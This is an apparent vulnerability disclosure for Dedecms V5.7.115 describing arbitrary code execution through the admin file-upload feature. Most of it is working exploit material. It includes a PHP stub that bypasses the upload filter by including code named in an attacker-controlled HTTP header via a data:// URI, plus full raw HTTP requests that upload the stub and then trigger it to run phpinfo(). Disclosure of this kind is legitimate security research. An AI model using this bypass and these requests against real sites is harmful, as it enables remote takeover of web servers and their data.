Dedecms V5.7.115 Arbitrary code execution via file upload vulnerability in the backend.

Access the Backend File Manager module and click File Upload.

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/image-20240831170104764.png)

First, a random selection of malicious php files were uploaded, and a filter was found to exist that.

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/image-20240831170129637.png)

After testing it can be bypassed using the following code

```php
require_once(end(apache_request_headers()));
```

The `end(apache_request_headers())` is the first `header` header in the returned http request packet, which we can control, and then the `require_once()` function can be commanded using the data pseudo-protocol.

So upload the contents of the file:

```php
<?php
require_once(end(apache_request_headers()));
```

**Vulnerability Validation:**

Uploading a malicious file poc

```
POST /dede/file_manage_control.php HTTP/1.1
Host: localhost:1110
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------21406382783539806003779668485
Content-Length: 636
Origin: http://localhost:1110
Connection: keep-alive
Referer: http://localhost:1110/dede/file_manage_view.php?fmdo=upload&activepath=
Cookie: menuitems=1_1%2C2_1%2C3_1; Phpstorm-9dbbfc29=4d9b54b0-3f53-4e67-ae29-a3fb9f021bbb; user=admin; name=aa%3Cscript%3Ealert%28111%29%3C%2Fscript%3E; mail=86226999%40qq.com; url=http%3A%2F%2F127.0.0.1; XDEBUG_SESSION=18740; PHPSESSID=ubqqaelnh1pbrcjgek9metfv23; last_vtime=1725083004; last_vtime1BH21ANI1AGD297L1FF21LN02BGE1DNG=613fbd4bd6a29f94; last_vid=admin; last_vid1BH21ANI1AGD297L1FF21LN02BGE1DNG=1cb3f31a783dddcb; _csrf_name_bad816b8=22f97ca1448b13ed105e52ab547e13b5; _csrf_name_bad816b81BH21ANI1AGD297L1FF21LN02BGE1DNG=5bd66f35ef9228e6; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=4070fec0b2589bb3; DedeLoginTime=1725090477; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=61ae1059018877cb
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: iframe
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=4

-----------------------------21406382783539806003779668485
Content-Disposition: form-data; name="activepath"


-----------------------------21406382783539806003779668485
Content-Disposition: form-data; name="fmdo"

upload
-----------------------------21406382783539806003779668485
Content-Disposition: form-data; name="upfile1"; filename="111.php"
Content-Type: application/octet-stream

<?php
require_once(end(apache_request_headers()));
-----------------------------21406382783539806003779668485
Content-Disposition: form-data; name="B1"

 上传文件 
-----------------------------21406382783539806003779668485--
```

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/image-20240831170511398.png)

See that the file has been uploaded successfully, in the root directory

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/image-20240831170533304.png)

Accessing the uploaded 111.php file constructs a new header on top of the host heaser header with the contents of the malicious pseudo-protocol utilizing the

```http
rce: data://text/plain,<?php phpinfo();?>
```

poc：

```
GET /111.php HTTP/1.1
rce: data://text/plain,<?php phpinfo();?>
Host: localhost:1110
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: Phpstorm-9dbbfc29=4d9b54b0-3f53-4e67-ae29-a3fb9f021bbb; user=admin; name=aa%3Cscript%3Ealert%28111%29%3C%2Fscript%3E; mail=86226999%40qq.com; url=http%3A%2F%2F127.0.0.1; XDEBUG_SESSION=18740; PHPSESSID=ubqqaelnh1pbrcjgek9metfv23; last_vtime=1725083004; last_vtime1BH21ANI1AGD297L1FF21LN02BGE1DNG=613fbd4bd6a29f94; last_vid=admin; last_vid1BH21ANI1AGD297L1FF21LN02BGE1DNG=1cb3f31a783dddcb; _csrf_name_bad816b8=22f97ca1448b13ed105e52ab547e13b5; _csrf_name_bad816b81BH21ANI1AGD297L1FF21LN02BGE1DNG=5bd66f35ef9228e6; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=4070fec0b2589bb3; DedeLoginTime=1725090477; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=61ae1059018877cb
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
```

Successful code execution as shown:

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/image-20240831170654160.png)

